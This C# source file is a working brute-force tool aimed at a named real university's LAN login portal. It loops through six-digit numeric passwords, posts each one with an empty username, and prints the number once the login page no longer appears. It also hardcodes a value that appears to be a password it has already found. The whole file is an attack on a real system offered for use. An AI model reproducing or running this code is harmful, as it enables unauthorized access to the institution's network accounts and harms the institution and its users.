using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;

namespace Radius_Authenticator
{
    class LoginAuth
    {
        private static int pass = 851450;
        
        public async Task<string> GetPostResponse(int i)
        {
            using (var client = new HttpClient())
            {
                var values = new Dictionary<string, string>
                                    {
                                        {"username","" },
                                        {"password",i.ToString() }
                                    };
                var content = new FormUrlEncodedContent(values);
                var res = await client.PostAsync("http://selfcare.bzu.edu.pk//login", content);
                var resString = await res.Content.ReadAsStringAsync();
                return resString;
            }
        }
        public void MyFunc()
        {
            for (int i = 51338; i < 999999; i++)
            {

                var address = "http://selfcare.bzu.edu.pk";
                var request = (HttpWebRequest)WebRequest.Create(address);
                try
                {
                    using (var response = request.GetResponse() as HttpWebResponse)
                    {
                        if (request.HaveResponse && response != null)
                        {
                            using (var reader = new StreamReader(response.GetResponseStream()))
                            {

                                var result = reader.ReadToEnd();
                                if (result.Contains("BZU LAN Centralized Login - BZU Multan"))
                                {
                                    var res = GetPostResponse(i);
                                    if (!res.IsCompleted)
                                    {
                                        res.Wait();

                                    }
                                  

                                }
                                else
                                {
                                    Debug.WriteLine(i);
                                    break;
                                }
                            }

                        }
                    }
                }

                catch (WebException wex)
                {
                    if (wex.Response != null)
                    {
                        using (var errorResponse = (HttpWebResponse)wex.Response)
                        {
                            using (var reader = new StreamReader(errorResponse.GetResponseStream()))
                            {
                                string error = reader.ReadToEnd();
                                //TODO: use JSON.net to parse this string and look at the error message
                            }
                        }
                    }
                }

            }
        }
    }
}
